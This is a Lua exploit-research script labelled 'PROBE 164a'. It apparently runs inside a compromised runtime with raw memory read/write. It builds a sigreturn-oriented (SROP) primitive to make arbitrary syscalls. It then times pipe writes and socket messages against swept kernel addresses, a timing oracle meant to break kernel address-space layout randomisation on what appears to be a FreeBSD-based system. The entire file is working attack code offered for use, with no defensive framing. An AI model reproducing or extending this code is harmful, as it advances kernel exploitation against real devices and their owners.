-- CRASH_CLASS: LOW
-- PROBE 164a: Nanosecond-precision KASLR timing oracle
--
-- clock_gettime(CLOCK_MONOTONIC=4) works (163a confirmed).
-- Test if write(fd, kernel_va, 1) or sysctl timing varies
-- with kernel VA page presence. Use 1000-iteration loops
-- for amplification.

print("=== PROBE 164a: KASLR NS TIMING ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

local TS1 = gpu + 0x10000
local TS2 = gpu + 0x10100

local function get_ns()
    wq(TS1, uint64(0))
    wq(TS1 + 8, uint64(0))
    srop(232, uint64(4), ga(0x10000))
    local s = rd(TS1)
    local ns = rd(TS1 + 8)
    return s * 1000000000 + ns
end

-- [A] Calibrate: measure SROP overhead
print("--- [A] SROP OVERHEAD ---")
local t0 = get_ns()
for i = 1, 100 do srop(20) end
local t1 = get_ns()
local srop_overhead_ns = (t1 - t0)
print("100x_srop_getpid=" .. srop_overhead_ns .. "ns (" ..
    math.floor(srop_overhead_ns / 100) .. "ns/call)")

-- [B] Pipe write timing with userland vs kernel VA
print("")
print("--- [B] PIPE WRITE TIMING ---")

local pfd = srop(42)
local pfdv = pfd and to_num(pfd) or -1
print("pipe=" .. pfdv)

if pfdv >= 0 then
    -- Write from userland buffer (should succeed)
    wd(gpu + 0x20000, 0x41)
    local WRITE_ITERS = 200

    -- Warmup
    for i = 1, 10 do
        srop(4, uint64(pfdv + 1), ga(0x20000), uint64(1))
        srop(3, uint64(pfdv), ga(0x20100), uint64(1))
    end

    -- Measure userland write
    t0 = get_ns()
    for i = 1, WRITE_ITERS do
        srop(4, uint64(pfdv + 1), ga(0x20000), uint64(1))
        srop(3, uint64(pfdv), ga(0x20100), uint64(1))
    end
    t1 = get_ns()
    local user_ns = t1 - t0
    print("userland_write: " .. user_ns .. "ns (" ..
        math.floor(user_ns / WRITE_ITERS) .. "ns/iter)")

    -- Measure kernel VA write (should fail at copyin)
    -- Test a sweep of kernel VA space to find timing differences
    local kva_offsets = {
        0x00000000, 0x00200000, 0x00400000, 0x00800000,
        0x01000000, 0x02000000, 0x04000000, 0x08000000,
        0x10000000, 0x20000000, 0x40000000, 0x80000000
    }

    for _, off in ipairs(kva_offsets) do
        local kva = uint64(string.format("0xFFFF8000%08X", off))
        t0 = get_ns()
        for i = 1, WRITE_ITERS do
            srop(4, uint64(pfdv + 1), kva, uint64(1))
        end
        t1 = get_ns()
        local kva_ns = t1 - t0
        local diff = kva_ns - user_ns
        local label = string.format("kva+0x%08X", off)
        print(label .. ": " .. kva_ns .. "ns (diff=" .. diff .. ")")
    end

    -- [C] Higher resolution: test 2MB-aligned pages around typical kernel load
    -- FreeBSD kernel typically at KERNBASE + slide, slide is MB-aligned
    print("")
    print("--- [C] FINE-GRAINED KVA SWEEP ---")

    -- Try 32MB chunks across first 2GB of kernel VA space
    for chunk = 0, 63 do
        local off = chunk * 0x2000000 -- 32MB steps
        local kva = uint64(string.format("0xFFFF8000%08X", off))
        t0 = get_ns()
        for i = 1, WRITE_ITERS do
            srop(4, uint64(pfdv + 1), kva, uint64(1))
        end
        t1 = get_ns()
        local kva_ns = t1 - t0
        print(string.format("  0xFFFF8000%08X: %dns", off, kva_ns))
    end

    srop(6, uint64(pfdv))
    srop(6, uint64(pfdv + 1))
end

-- [D] Recvmsg timing oracle
-- SCM_CREDS on AF_UNIX leaks struct ucred from kernel.
-- Time the recvmsg with different-sized control buffers.
print("")
print("--- [D] RECVMSG TIMING ---")

local sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x30000))
local spv = sp and to_num(sp) or -999
print("socketpair=" .. spv)

if spv == 0 then
    local fd0 = rd(gpu + 0x30000)
    local fd1 = rd(gpu + 0x30000 + 4)
    print("fds: " .. fd0 .. "," .. fd1)

    -- Time basic sendmsg/recvmsg cycle
    local MSG_ITERS = 100

    -- Build send msghdr
    local IOV = gpu + 0x31000
    local DATA = gpu + 0x32000
    wd(DATA, 0x41)
    wq(IOV, ga(0x32000))
    wq(IOV + 8, uint64(1))

    local SMSG = gpu + 0x33000
    for off = 0, 0x3F, 4 do wd(SMSG + off, 0) end
    wq(SMSG + 16, ga(0x31000))
    wd(SMSG + 24, 1)

    -- Build recv msghdr
    local RIOV = gpu + 0x34000
    local RDATA = gpu + 0x35000
    wq(RIOV, ga(0x35000))
    wq(RIOV + 8, uint64(4))

    local RMSG = gpu + 0x36000
    for off = 0, 0x3F, 4 do wd(RMSG + off, 0) end
    wq(RMSG + 16, ga(0x34000))
    wd(RMSG + 24, 1)

    t0 = get_ns()
    for i = 1, MSG_ITERS do
        srop(28, uint64(fd0), ga(0x33000), uint64(0))
        srop(27, uint64(fd1), ga(0x36000), uint64(0))
    end
    t1 = get_ns()
    print("sendmsg/recvmsg: " .. (t1 - t0) .. "ns (" ..
        math.floor((t1 - t0) / MSG_ITERS) .. "ns/iter)")

    srop(6, uint64(fd0))
    srop(6, uint64(fd1))
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
